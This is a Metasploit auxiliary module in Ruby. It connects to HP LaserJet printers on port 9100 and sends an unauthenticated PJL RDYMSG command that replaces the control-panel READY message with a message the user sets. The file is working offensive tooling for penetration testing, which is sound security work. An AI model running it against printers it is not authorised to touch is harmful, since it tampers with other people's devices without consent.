##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize(info={})
		super(update_info(info,
			'Name'           => 'HP LaserJet Printer Replace READY Message',
			'Description'    => %q{
				This module allows to specifie a message that replaces the READY
				message on the printer control panel. Does not affect online state.
			},
			'References'     =>
				[
					['URL', 'http://h20000.www2.hp.com/bc/docs/support/SupportManual/bpl13208/bpl13208.pdf']
				],
			'Author'         => 'Matteo Cantoni <goony[at]nothink.org>',
			'License'        => MSF_LICENSE
		))

		register_options(
			[
				Opt::RPORT(9100),
				OptString.new('MESSAGE', [true, 'The message that will appear on the printer control panel', 'MSF!'])
			], self.class)

		deregister_options('VHOST')
	end

	# PJL commands are recognized by the following HP printers:
	#
	# . LaserJet IIISi, 4Si, 4SiMx, 5Si, 5SiMx, 5Si Mopier
	# . LaserJet 1100 Series, 2100 Series
	# . LaserJet 4000 Series, 5000 Series
	# . LaserJet 8000 Series, 8100 Series
	# . LaserJet 4V, 4MV
	# . LaserJet 4, 4 Plus, 4M, 4M Plus, 5, 5M
	# . LaserJet 4L, 4ML, 4LJ Pro, 4LC, 5L, 6L
	# . LaserJet 4P, 4MP, 4PJ, 5P, 6P, 6MP
	# . Color LaserJet, Color LaserJet 5, 5M
	# . Color LaserJet 4500 Series, 8500 Series
	# . DeskJet 1200C, 1600C
	# . DesignJet Family
	# . PaintJet XL300

	def run_host(ip)

		port = datastore['RPORT']

		# The message can be any combination of printable characters (except
		# quotation marks, character 34) and spaces, with a limit of 1 line
		# of 16 characters. The message variable is a string and must be
		# enclosed in double quotes as shown in the command syntax.
		message = datastore['MESSAGE']

		if ((message.length() > 16) or (message =~ /"/))
			print_error("Message invalid. Max 16 characters and no quotation marks.")
			return
		end

		print_status("Connecting to #{ip}:#{port}...")

		conn = connect

		# Format of PJL Commands - #4
		#
		# @PJL command [command modifier : value] [option name [= value]] [<CR>]<LF>
		# This format is used for all of the other PJL commands.
		# The PJL prefix .@PJL. always must be uppercase.
		prefix = "@PJL "
		postfix = "\r\n"

		# RDYMSG specifies a "ready message" that replaces the "00 READY"
		# message on the printer control panel. The RDYMSG command does
		# not affect the online state.
		command = 'RDYMSG DISPLAY = "' + message + '"'

		req = prefix + command + postfix

		vprint_status("Sending request to #{ip}: #{req.chop}")

		conn.put(req)

		# Using RDYMSG command we cannot wait for an answer.. so we go away!
		print_status("Now you can manually verify on printer control panel.")

		disconnect
	end
end
